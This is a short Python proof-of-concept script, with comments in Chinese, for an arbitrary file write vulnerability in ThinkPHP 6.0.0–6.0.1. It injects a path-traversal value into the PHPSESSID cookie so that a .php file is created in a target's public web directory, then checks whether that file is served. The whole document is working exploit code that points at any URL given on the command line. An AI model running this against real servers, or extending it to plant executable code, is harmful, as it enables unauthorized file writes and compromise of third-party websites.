#thinkphp6 任意文件写入漏洞poc
#影响版本 thinkhp6.0.0-thinkphp6.0.1
#用法:python3 thinkphp6_file_write.py http://target.com
#微信公众号:漏洞推送
import requests
import random
import sys

randstr = str(random.randint(100000000,999999999))
headers = {
    'Cookie':'PHPSESSID=../../../../public/'+randstr+'.php'
}

if __name__ == "__main__":
    if(len(sys.argv)<2):
        exit('Usage: python3 thinkphp6_file_write.py http://target.com')
    else:
        url = sys.argv[1]
        requests.get(url,headers=headers)
        r = requests.get(url+'/'+randstr+'.php')
        if(r.status_code==200 and (r.headers['Content-type'].find('text/html') != -1)):
            print('target is vulnerable')
        else:
            print('target is not vulnerable')
